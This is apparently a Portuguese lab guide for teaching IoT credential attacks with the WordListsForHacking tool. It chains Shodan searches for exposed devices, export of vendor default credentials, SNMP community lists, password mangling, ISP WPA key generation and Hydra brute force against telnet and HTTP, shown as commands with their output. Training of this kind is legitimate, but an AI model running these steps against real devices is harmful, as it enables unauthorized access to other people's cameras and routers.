# Lab 01 — WordListsForHacking (WFH)

**Repo:** `submodules/Uniao-Geek/WordListsForHacking`  
**Entry:** `python wfh.py`  
**Versao auditada:** 2.6.3  
**Papel no IoT:** gerar listas de credenciais para telnet, HTTP admin, SNMP e brute force pos-Shodan.

---

## 0. Verificar instalacao

**IN**
```powershell
cd C:\Projetos-SafeLabs\submodules\Uniao-Geek\WordListsForHacking
python wfh.py --help
```

**OUT**
```
WordList For Hacking  v2.6.3
...
{charset,pattern,...,default-creds,isp-keygen,...,combiner,...}
```

---

## 1. Shodan → superficie (recon, sem WFH)

Objetivo: achar marca/protocolo antes de gerar wordlist.

| Categoria | Query Shodan |
|-----------|--------------|
| Camera HTTP | `product:"Hikvision" port:80,8000` |
| Telnet IoT | `port:23 "login:" embedded` |
| Router BR | `"Intelbras" http.html port:80` |
| MikroTik | `product:"MikroTik" port:8291,80` |

**IN** (Shodan CLI, opcional)
```bash
shodan search 'product:"MikroTik" port:8291 country:BR' --fields ip_str,port,org --limit 5
```

**OUT** (exemplo ilustrativo)
```
185.x.x.x   8291    ISP Cliente XYZ
177.x.x.x   80      Provedor ABC
```

Variavel para slides: `TARGET_VENDOR=mikrotik`, `TARGET_IP=192.168.10.1` (lab).

---

## 2. Listar vendors na base de credenciais default

**IN**
```powershell
python wfh.py default-creds --list-vendors
```

**OUT**
```
[+] 163 vendors in database:
  2wire
  3com
  ...
  mikrotik
  ...
  tplink
```

---

## 3. Exportar credenciais default por vendor

**IN**
```powershell
python wfh.py default-creds --vendor mikrotik -o ..\..\..\..\.tmp\lab-mikrotik-creds.lst
```

**OUT**
```
[+] 281 credentials written to .tmp\lab-mikrotik-creds.lst
```

**IN** (conferir arquivo)
```powershell
Get-Content ..\..\..\..\.tmp\lab-mikrotik-creds.lst -TotalCount 8
```

**OUT**
```
admin:
admin:admin
admin:password
admin:123456
admin:mikrotik
admin:routeros
```

Slide: usar `admin:admin` e `admin:` (senha vazia) como primeiros testes no lab MikroTik.

---

## 4. Credenciais SNMP (comunidades IoT)

**IN**
```powershell
python wfh.py default-creds --snmp -o ..\..\..\..\.tmp\lab-snmp.lst
```

**OUT**
```
[+] N SNMP communities written to .tmp\lab-snmp.lst
```

**OUT** (trecho tipico do arquivo)
```
public
private
manager
```

---

## 5. Filtro por categoria (router / printer)

**IN**
```powershell
python wfh.py default-creds --category router --vendor tplink -o ..\..\..\..\.tmp\lab-tplink-router.lst
python wfh.py default-creds --category printer --vendor hp -o ..\..\..\..\.tmp\lab-hp-printer.lst
```

**OUT**
```
[+] N credentials written to .tmp\lab-tplink-router.lst
[+] N credentials written to .tmp\lab-hp-printer.lst
```

Se `N=0`, tentar `--list-vendors` e ajustar grafia do vendor (ex.: `tp-link` vs `tplink`).

---

## 6. Mangle — mutar senhas conhecidas

**IN** (criar seed)
```powershell
Set-Content -Path ..\..\..\..\.tmp\seed.lst -Value "admin`n12345`nintelbras"
python wfh.py mangle ..\..\..\..\.tmp\seed.lst --rules capitalize,leet_basic,append_num -o ..\..\..\..\.tmp\mangled.lst
```

**OUT**
```
[+] Generated: N candidates
```

**OUT** (trecho de `mangled.lst`)
```
Admin
4dm1n
admin1
12345!
```

---

## 7. Combiner — permutacoes de palavras-chave

**IN**
```powershell
python wfh.py combiner intelbras admin 2024 --tails "!,@,#,123" -o ..\..\..\..\.tmp\intelbras-combo.lst
```

**OUT**
```
[+] Generated: N combined entries
```

**OUT** (exemplos de linhas)
```
intelbrasadmin2024!
intelbras_admin_2024
adminintelbras123
```

---

## 8. Pattern — template com variaveis

**IN**
```powershell
python wfh.py pattern -t "{word}{year}!" --words admin,suporte --years 2024,2025 -o ..\..\..\..\.tmp\pattern-iot.lst
```

**OUT**
```
[+] Generated: N entries
```

---

## 9. ISP keygen (roteadores BR)

**IN**
```powershell
python wfh.py isp-keygen --help
python wfh.py isp-keygen --ssid "NET_VIRTUA" -o ..\..\..\..\.tmp\isp-keys.lst
```

**OUT** (help mostra ISPs suportados; arquivo com chaves candidatas WPA)

Slide: correlacionar SSID visto no Shodan/WiFi survey com keygen.

---

## 10. Integracao com hydra/medusa (lab autorizado)

**IN**
```bash
hydra -L usernames.lst -P .tmp/lab-mikrotik-creds.lst 192.168.10.1 http-get /
```

**OUT** (sucesso no lab)
```
[80][http-get] host: 192.168.10.1   login: admin   password: admin
```

**IN** (telnet camera lab)
```bash
hydra -C .tmp/lab-mikrotik-creds.lst 192.168.10.50 telnet
```

**OUT**
```
[23][telnet] host: 192.168.10.50   login: admin   password: 12345
```

---

## 11. Fluxo completo slide-a-slide

| Slide | Titulo | IN resumido | OUT esperado |
|-------|--------|-------------|--------------|
| 1 | Recon Shodan | `shodan search ...` | Lista IP + org |
| 2 | Vendor → creds | `wfh.py default-creds --vendor X` | Arquivo `.lst` |
| 3 | Mutacao | `wfh.py mangle seed.lst` | Lista expandida |
| 4 | Brute lab | `hydra -P lista.lst TARGET` | `login:password` ou falha |

---

## 12. Troubleshooting

| Sintoma | Causa | Acao |
|---------|-------|------|
| `0 credentials written` | Vendor nao na base | `--list-vendors`, tentar sinonimo |
| Banner ASCII duplicado | Normal no WFH | Ignorar arte ASCII; ler linhas `[+]` |
| pip timeout | Rede/PyPI | Usar Python do sistema com deps ja instaladas |
| hydra sem match | Firmware patchado | Voltar ao Shodan por outro alvo no lab |

---

## Mapa comando → cenario IoT

| Comando WFH | Quando usar apos Shodan |
|-------------|-------------------------|
| `default-creds` | Painel web / telnet com login conhecido por marca |
| `default-creds --snmp` | Porta 161 aberta |
| `mangle` | Uma senha default quase certa |
| `combiner` | Marca + ano + sufixo corporativo |
| `isp-keygen` | Roteador ISP residencial BR |
| `pattern` | Politica de senha previsivel |
